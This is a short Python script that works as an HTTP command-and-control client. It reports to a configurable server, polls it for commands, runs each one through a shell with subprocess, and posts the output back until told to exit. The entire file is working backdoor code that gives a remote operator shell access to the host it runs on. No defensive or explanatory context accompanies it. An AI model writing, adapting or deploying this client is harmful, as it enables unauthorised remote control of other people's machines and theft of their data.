import requests
import subprocess 
import os
import json
import socket

#CHANGE URL TO MATCH SERVER IP + PORT
url = "http://127.0.0.1:8080"

host = str(socket.gethostbyname(socket.gethostname()))

#Simple createJSON function takes command fr
def createJSON(output):
	returnedJSON =  {"data": "" + output + ""}
	return returnedJSON

def postToServer(output):
	json = createJSON(output)
	resp = requests.post(url, json=json)

#returns command string derived from json
def getFromServer():
	response = requests.get(url)
	answer = response.json()	
	if(answer):
		return answer["command"]
	else:
		return " " 




#Start process with POST REQUEST to server 
connectString = "[+] Connected to " + host
postToServer(connectString)


# Main body lives in while loop 
while (True): 

	command = getFromServer()
	if (command != " "):
		#ACCEPT COMMAND and send to cli
		CMD =  subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
		postToServer(CMD.stdout.read() + CMD.stderr.read())

	if (command == "exit"):
		break

disconnectString = "[-] Disconnected from " + host
postToServer(disconnectString)